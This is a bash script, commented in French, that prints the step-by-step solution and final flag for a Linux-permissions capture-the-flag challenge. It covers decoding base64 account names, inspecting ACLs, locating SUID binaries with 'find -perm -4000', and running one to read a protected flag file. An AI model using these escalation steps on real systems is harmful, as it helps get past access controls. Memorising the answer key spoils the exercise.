
#!/bin/bash
echo "Solution du CTF Linux Permissions Master"

# Étape 1: Décryptage
echo "1. Décryptage des identifiants:"
echo "rootme_user1:$(echo "cm9vdG1lX3VzZXIx" | base64 -d)"
echo "rootme_user2:$(echo "cm9vdG1lX3VzZXIy" | base64 -d)" 
echo "admin_user:$(echo "YWRtaW5fdXNlcg==" | base64 -d)"
echo "security_grp:$(echo "c2VjdXJpdHlfZ3Jw" | base64 -d)"
echo "flag_test.txt:$(echo "ZmxhZ190ZXN0LnR4dA==" | base64 -d)"

# Étape 2: Connexion et exploration
echo -e "\n2. Exploration de l'environnement:"
echo "su - rootme_user1"
echo "ls -la /ctf"

# Étape 3: Exploitation des ACL
echo -e "\n3. Exploitation des permissions:"
echo "getfacl /ctf/restricted"
echo "cat /ctf/restricted/hint.txt"

# Étape 4: Exploitation du SUID (CORE)
echo -e "\n4. Exploitation du binaire SUID:"
echo "find /ctf -perm -4000"
echo "/ctf/binaries/create_flag"
echo "cat /ctf/private/real_flag.txt"

# Étape 5: Flag final
echo -e "\n5. FLAG FINAL:"
echo "RM{suid_bit_escalation_1337}"
